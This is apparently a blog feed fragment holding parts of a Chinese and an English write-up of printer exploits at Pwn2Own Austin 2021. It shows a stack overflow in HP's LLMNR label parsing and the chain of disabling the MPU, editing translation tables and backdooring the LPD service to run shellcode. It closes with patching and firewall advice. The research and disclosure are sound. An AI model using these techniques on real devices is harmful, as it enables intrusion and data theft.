      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xC0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;src&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;dst&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;.&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;dst&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//----------[2]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;dst&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;而在 consume_labels 中的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[1]&lt;/code&gt; 會先取得 label 長度，接著根據型態去處理，而在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[2]&lt;/code&gt; 則是處理一般長度的情況，此處並&lt;strong&gt;沒有對長度做檢查&lt;/strong&gt;，就直接將 label 寫進 dst buffer 中，導致了 stack overflow，到此處我們原以為差不多結束了，接下來應該如同 Canon 類似的方法就可以 Exploit 了。然而當我們在寫 Exploit 時發現 HP 比 Canon 多了一些保護機制。&lt;/p&gt;

&lt;h4 id=&quot;protection-1&quot;&gt;Protection&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;No Stack Guard&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;XN(DEP)&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Memory Protect Unit (MPU)&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;No ASLR&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在 HP 印表機中，多了 XN 及 MPU 的記憶體保護措施，另外這個漏洞也有了更多的限制。我們&lt;strong&gt;只能 overflow 約 0x100 bytes&lt;/strong&gt; 及&lt;strong&gt;不能有 null 字元&lt;/strong&gt;，這大幅限制了我們的 ROP，使得我們沒辦法單靠 ROP 做到後續行動，需要另外找其他的漏洞或其他方法才能達成我們的目標。在一段時間後，我們開始思考，HP 印表機是如何去實作 &lt;strong&gt;XN(DEP)&lt;/strong&gt; 及 &lt;strong&gt;MPU&lt;/strong&gt; 的? 我們回顧一下 HP RTOS:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;所有 Service code 及 Kernel Code 都在同一個 Binary 中。&lt;/li&gt;
  &lt;li&gt;大多數的 task 都跑在同一個記憶體空間底下(沒有 Process isolation)，也幾乎都跑在高權限模式&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;看完以上兩點，會想到是不是理解 HP RTOS 中的 MMU 及 MPU 就可以繞過呢？&lt;/p&gt;

&lt;p&gt;我們來看一下 HP RTOS MMU 機制&lt;/p&gt;

&lt;h4 id=&quot;mmu-in-hp-m283fdw&quot;&gt;MMU in HP M283fdw&lt;/h4&gt;
&lt;p&gt;在 HP M283fdw 中使用的是一階層的 Translation table 來做 Address translation ，每個 translation table entry 都表示 1MB 的 Section，而 Translation table 則是&lt;strong&gt;固定在 0x4003c000&lt;/strong&gt; 這個位置上&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/23.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;而每個 translation table entry 都會對應到 physical address 及該 section 的權限，CPU 就是根據這些內容決定執行權限、記憶體內容修改權限，如果我們可以修改 translation table entry 的內容就可以更改記憶體權限，也可以透過它來 Mapping 任意 Physical address，這邊跟權限有關的主要會有 AP APX 跟 XN。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/24.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我們可以從前述的漏洞中注意到，在有 stack overflow 且也跑在高權限下，就可通過 ROP 修改 translation table entry，但當我們對嘗試直接對 translation table 做寫入後，結果&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/25.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;造成印表機 Crash，查了一下發現是 memory fault exception，主要造成原因就是因為 Memory Protect Unit (MPU) 有對該記憶體區段做保護。&lt;/p&gt;

&lt;p&gt;好，那我們就來看看 MPU 的機制。&lt;/p&gt;

&lt;h4 id=&quot;mpu-in-hp-m283fdw&quot;&gt;MPU in HP M283fdw&lt;/h4&gt;

&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Memory_protection_unit&quot;&gt;MPU&lt;/a&gt; 主要功能是把 memory 拆分成好幾個 region 並定義每個 region 的權限，與 MMU 是完全不同的機制，很常出現在 IoT 設備中。
HP 則是在開機就會啟用，並將每個 region 定義好權限，因此無法自己操作 page table。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/26.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在長時間逆向及參考 &lt;a href=&quot;https://developer.arm.com/documentation/ddi0403/d/System-Level-Architecture/System-Address-Map/Protected-Memory-System-Architecture--PMSAv7/Register-support-for-PMSAv7-in-the-SCS?lang=en#BEHJFJDI&quot;&gt;ARM Manual&lt;/a&gt; 之後，我們發現事實上只要清空 MPU_CTRL 就可關閉 MPU，在經過逆向後 HP M283fdw 的 MPU_CTRL 位置是在 0xE0400304，這邊稍微跟 ARM 的 spec 有點不同，不太確定原因就是了。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/27.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h4&gt;
&lt;p&gt;在了解 HP 的 MMU 及 MPU 機制後，我們可輕易地利用 ROP 來關閉 MPU，並成功修改 translation table entry，我們可以任意的修改任何 serivce 的程式碼，這邊我們最後選擇了 &lt;a href=&quot;https://en.wikipedia.org/wiki/Line_Printer_Daemon_protocol&quot;&gt;Line Printer Daemon(LPD)&lt;/a&gt; 這個服務來修改，將它修改成後門: 讀入更多的 Payload 到指定的位置上，最終執行我們送過去的 shellcode。&lt;/p&gt;

&lt;p&gt;但有一點必須特別注意，覆蓋完 translation table entry 跟 LPD 的 code 後，務必要 &lt;strong&gt;flush TLB&lt;/strong&gt; 跟&lt;strong&gt;清掉 I-cache 和 D-cache&lt;/strong&gt;  不然很有可能還是跑在舊有的程式碼上面導致 exploit 失敗。&lt;/p&gt;

&lt;p&gt;Flush TLB&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;flush_tlb:
    mov r12, #0
    mcr p15, 0, r12, c8, c7, 0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Invalidate I-cache&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;disable_icache:
    mrc p15, 0, r1, c1, c0, 0
    bic r1, r1, #(1 &amp;lt;&amp;lt; 12)
    mcr p15, 0, r1, c1, c0, 0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我們重新整理了一下利用步驟&lt;/p&gt;

&lt;h4 id=&quot;exploitation-step-1&quot;&gt;Exploitation Step&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;首先先觸發 LLMNR 的 stack overflow&lt;/li&gt;
  &lt;li&gt;利用有限的 ROP 關閉 MPU&lt;/li&gt;
  &lt;li&gt;利用 ROP 改掉 translation table entry 獲得讀寫執行權限&lt;/li&gt;
  &lt;li&gt;Flush TLB&lt;/li&gt;
  &lt;li&gt;改掉 LPD service 的程式碼&lt;/li&gt;
  &lt;li&gt;清掉 I-cache 和 D-cache&lt;/li&gt;
  &lt;li&gt;使用改過的 LPD 讀我們的 shellcode 後並執行&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;pwn2own-austin-2021-2&quot;&gt;Pwn2Own Austin 2021&lt;/h4&gt;
&lt;p&gt;到可以執行 shellcode 時，我們只剩一週時間，我們最後選擇跟 Canon 一樣使用改字串顯示 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Pwned by DEVCORE&lt;/code&gt; 到 LCD 上。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/28.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;而幸運的是，我們第一次嘗試就成功了：）&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/vQbQImZ3XRw?start=29093&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;p&gt;在這之後我們也嘗試了直接把後門改成 debug console 上面，方便利用許多功能，例如查看記憶體資訊，播放音樂等等功能，&lt;a href=&quot;https://twitter.com/fsecurelabs&quot;&gt;F-Secure Labs&lt;/a&gt; 在比賽時就使用播放音樂這個功能來呈現，非常有趣，可以到&lt;a href=&quot;https://youtu.be/c82uFBdTvII?t=1263&quot;&gt;這裡&lt;/a&gt;看當時的情況。&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/S9TkvaAmyMw&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h3 id=&quot;result&quot;&gt;Result&lt;/h3&gt;
&lt;p&gt;在 Pwn2Own Austin 2021 中，我們打下其他設備跟印表機後最終獲得了第二名，以這次來說獲得不錯經驗，也學到了一些新東西。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/29.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;而對於一般用戶們，有什麼方法可以避免印表機被當作攻擊目標甚至是跳板呢?&lt;/p&gt;

&lt;h2 id=&quot;mitigation&quot;&gt;Mitigation&lt;/h2&gt;
&lt;h3 id=&quot;update&quot;&gt;Update&lt;/h3&gt;

&lt;p&gt;首先就是定期更新，上述的印表機都已有 patch，這邊是很常被大家忽略的一部分，我們很常看到印表機好幾年了都沒更新，甚至直接預設密碼放著，很容易就被當成目標。&lt;/p&gt;

&lt;h3 id=&quot;disable-unused-service&quot;&gt;Disable unused service&lt;/h3&gt;

&lt;p&gt;另外一點就是盡可能關掉沒在用的服務， 大部分的印表機預設開啟過多平常根本不會用的服務，我們甚至認為可以關掉 discovery 服務，只要開你要用的就好了。&lt;/p&gt;

&lt;h3 id=&quot;firewall&quot;&gt;Firewall&lt;/h3&gt;
&lt;p&gt;更好的做法可以再加上 firewall，大部分印表機也都有提供相關功能。&lt;/p&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
&lt;p&gt;事實上，我們獲得 shellcode 執行後，除了印東西在 LCD 外，我們可以藉由印表機來竊取機密資訊，不論是機密文件或是一些 credential，印表機也是個平行移動 (Lateral Movement) 的點，而且很難被偵測到，是紅隊中非常好的目標。另外很多印表機上的發現服務系列的協定或是 DNS 系列的協定很常出問題，如果想找類似印表機或其他 IoT 設備的漏洞，也許可以優先朝這個方向看看。&lt;/p&gt;

&lt;h2 id=&quot;to-be-continue&quot;&gt;To be continue&lt;/h2&gt;
&lt;p&gt;最後，我們在去年 &lt;a href=&quot;https://www.thezdi.com/blog/2022/8/29/announcing-pwn2own-toronto-2022-and-introducing-the-soho-smashup&quot;&gt;Pwn2Own Toronto 2022&lt;/a&gt; 中，也在印表機系列中找到幾個漏洞，我們也將會在近期發佈詳細資訊，敬請期待 Part II&lt;/p&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://labs.withsecure.com/assets/BlogFiles/Printing-Shellz.pdf&quot;&gt;https://labs.withsecure.com/assets/BlogFiles/Printing-Shellz.pdf&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://foxglovesecurity.com/2017/11/20/a-sheep-in-wolfs-clothing-finding-rce-in-hps-printer-fleet/&quot;&gt;https://foxglovesecurity.com/2017/11/20/a-sheep-in-wolfs-clothing-finding-rce-in-hps-printer-fleet/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://research.checkpoint.com/2018/sending-fax-back-to-the-dark-ages/&quot;&gt;https://research.checkpoint.com/2018/sending-fax-back-to-the-dark-ages/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2023/10/05/your-printer-is-not-your-printer-hacking-printers-pwn2own-part1/</link>
                <guid>https://devco.re/blog/2023/10/05/your-printer-is-not-your-printer-hacking-printers-pwn2own-part1</guid>
                <pubDate>Thu, 05 Oct 2023 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Your printer is not your printer ! - Hacking Printers at Pwn2Own Part I</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2023/10/05/your-printer-is-not-your-printer-hacking-printers-pwn2own-part1-en/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2023/10/05/your-printer-is-not-your-printer-hacking-printers-pwn2own-part1/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Printer has become one of the essential devices in the corporate intranet in the past few years, and its functionalities have also increased significantly. Not only printing or faxing, cloud printing services like AirPrint are also supported to make it easier to use. Direct printing from mobile devices is now a basic requirement in the IoT era. We also use it to print some internal business documents of the company, which makes it even more important to keep the printer secure.&lt;/p&gt;

&lt;p&gt;In 2021, we found Pre-auth RCE vulnerabilities(&lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-22-515/&quot;&gt;CVE-2022-24673&lt;/a&gt; and &lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-22-532/&quot;&gt;CVE-2022-3942&lt;/a&gt;) in Canon and HP printers, and vulnerability(&lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-22-332/&quot;&gt;CVE-2021-44734&lt;/a&gt;) in Lexmark. We used these vulnerabilities to exploit Canon ImageCLASS MF644Cdw, HP Color LaserJet Pro MFP M283fdw and Lexmark MC3224i in &lt;a href=&quot;https://www.zerodayinitiative.com/blog/2021/11/1/pwn2ownaustin&quot;&gt;Pwn2Own Austin 2021&lt;/a&gt;. Following we will describe the details of the Canon and HP vulnerabilities and exploitation.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/1.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This research is also presented at &lt;a href=&quot;https://hitcon.org/2022/agenda/704bf58c-c42b-4593-97c0-9aba91caa6e4&quot;&gt;HITCON 2022&lt;/a&gt; and &lt;a href=&quot;https://codeblue.jp/2022/en/talks/&quot;&gt;CODE BLUE 2022&lt;/a&gt;. You can check the &lt;a href=&quot;https://hitcon.org/2022/slides/Your%20Printer%20is%20not%20your%20Printer%20!%20-%20Hacking%20Printers%20at%20Pwn2Own.pdf&quot;&gt;slides&lt;/a&gt; here.&lt;/p&gt;

&lt;h2 id=&quot;printer&quot;&gt;Printer&lt;/h2&gt;
&lt;p&gt;In the early days, it often required an IEEE1284 or USB Printer cable to connect the printer to the computer. We also had to install the printer driver provided by the manufacturer. Nowadays, most of the printers on the market do not require USB or traditional cable. As long as the printer is connected to the intranet through a LAN cable, we can find and utilize the printer immediately.&lt;/p&gt;

&lt;p&gt;Printer also provides not only printing but also various services such as FTP, AirPrint, Bonjour. Nothing more than to make printing more convenient.&lt;/p&gt;

&lt;h2 id=&quot;motivation&quot;&gt;Motivation&lt;/h2&gt;

&lt;h3 id=&quot;why-do-we-want-to-research-printers-&quot;&gt;Why do we want to research Printers ?&lt;/h3&gt;

&lt;h4 id=&quot;red-team&quot;&gt;Red Team&lt;/h4&gt;
&lt;p&gt;While doing red team assessment, we found that printers generally appeared in the corporate intranet. There are almost always more than one, but they are usually overlooked and lack of update. It is also an excellent target for red team to hide the action because it is often difficult to detect. It is worth mentioning that larger enterprises are also likely to connect them to AD and become the entry point for confidential information.&lt;/p&gt;

&lt;h4 id=&quot;pwn2own-austin-2021&quot;&gt;Pwn2Own Austin 2021&lt;/h4&gt;
&lt;p&gt;Another reason is that printers have become one of the main targets of Pwn2Own Mobile. We were also preparing to participate the Pwn2Own stage again, so we decided to start with it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/2.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;At first, we thought they were trivial. Like most IoT devices, there are often many command injection vulnerabilities. However, many printers use RTOS instead of Linux systems, which drove our determination to challenge it.&lt;/p&gt;

&lt;p&gt;This article will focus on the Canon and HP parts.&lt;/p&gt;

&lt;h2 id=&quot;analysis&quot;&gt;Analysis&lt;/h2&gt;
&lt;p&gt;In the beginning, we read many &lt;a href=&quot;https://chdk.fandom.com/wiki/DryOS_PIXMA_Printer_Shell&quot;&gt;articles&lt;/a&gt;, all of them need to tear down the hardware for analysis and obtaining the debug console. Then they use the memory dumping method to obtain the original firmware. But in the end, we chose another way and didn’t tear down any of the printers.&lt;/p&gt;

&lt;h3 id=&quot;canon&quot;&gt;Canon&lt;/h3&gt;

&lt;h4 id=&quot;firmware-extract&quot;&gt;Firmware Extract&lt;/h4&gt;
&lt;p&gt;The initial analysis version is v6.03, we used binwalk to analyze it at the beginning, but the firmware is obfuscated, we can’t analyze it directly.&lt;/p&gt;

&lt;p&gt;Obfuscated Canon ImageCLASS MF644Cdw firmware
&lt;img src=&quot;/assets/img/blog/20231005/3.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We also tried &lt;a href=&quot;https://www.synacktiv.com/publications/treasure-chest-party-quest-from-doom-to-exploit.html&quot;&gt;“TREASURE CHEST PARTY QUEST: FROM DOOM TO EXPLOIT”&lt;/a&gt; by Synacktiv and &lt;a href=&quot;https://web.archive.org/web/20220224100459/https://www.contextis.com/en/blog/hacking-canon-pixma-printers-doomed-encryption&quot;&gt;“Hacking Canon Pixma Printers – Doomed Encryption”&lt;/a&gt; by Contextis research. But this time, it’s an entirely different series, and we can’t use the same method to deobfuscate the firmware.&lt;/p&gt;

&lt;p&gt;So we started to analyze the obfuscated firmware format and content.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/4.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can see from the obfuscated firmware that the beginning is the Magic NCFW, followed by the size of the firmware, and other parts are obfuscated data.&lt;/p&gt;

&lt;p&gt;So we started to think that maybe the old firmware of this printer is not obfuscated until a specific version. If we can get the intermediate version, maybe there is a chance to get the deobfuscation method. The magic header also lets us distinguish whether it is obfuscated.&lt;/p&gt;

&lt;p&gt;We can obtain the firmware download URL through the official website or the update packet.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://pdisp01.c-wss.com/gdl/WWUFORedirectTarget.do?id=MDQwMDAwNDc1MjA1&amp;amp;cmp=Z01&amp;amp;lang=EN
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After analysis, it can be split into three parts.
&lt;img src=&quot;/assets/img/blog/20231005/5.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ｗe can roughly infer the rules of the download URL. We use this method to download all versions of firmware. The versions we downloaded at that time included:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;V2.01&lt;/li&gt;
  &lt;li&gt;V4.02&lt;/li&gt;
  &lt;li&gt;V6.03&lt;/li&gt;
  &lt;li&gt;V9.03&lt;/li&gt;
  &lt;li&gt;V10.02&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;V10.02 is a version that will be released in a few weeks, and you can download it from here first. After downloading all versions, we found that the firmware for this series is obfuscated, and there is no way to deobfuscate it from the previous version.&lt;/p&gt;

&lt;p&gt;But we can try downloading Canon’s other series firmware and find out if there is a similar obfuscation algorithm. After all the firmware is downloaded, the total file size is 130 GB. We can find unobfuscated firmware by grepping for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NCFW&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;servicemode.html&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/6.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finally, we found four firmware that meets the conditions. We chose WG7000 series printers to analyze and found the suspected deobfuscation function.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/7.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Fortunately, by rewriting this function, the MF644Cdw firmware can be deobfuscated.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/8.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After the firmware is extracted, we needed the image base address so that IDA can effectively identify and reference the strings. At first, we find the image base through the common analysis tool &lt;a href=&quot;https://github.com/sgayou/rbasefind&quot;&gt;rbasefind&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/9.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The first base we found was 0x40b0000. But after decompiled it with IDA, most of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;function&lt;/code&gt; did not correspond to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;debug message&lt;/code&gt; string.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/10.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As shown in the figure above, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;loc_4489AC08&lt;/code&gt; should point to the string of the function name, but this address is not a regular string. Instead, it is recognized as a code section, and the content is not a string. This indicates that this location is not an actual address. We thought there was a slight offset, but it did not cause big problem for decompiling functions.&lt;/p&gt;

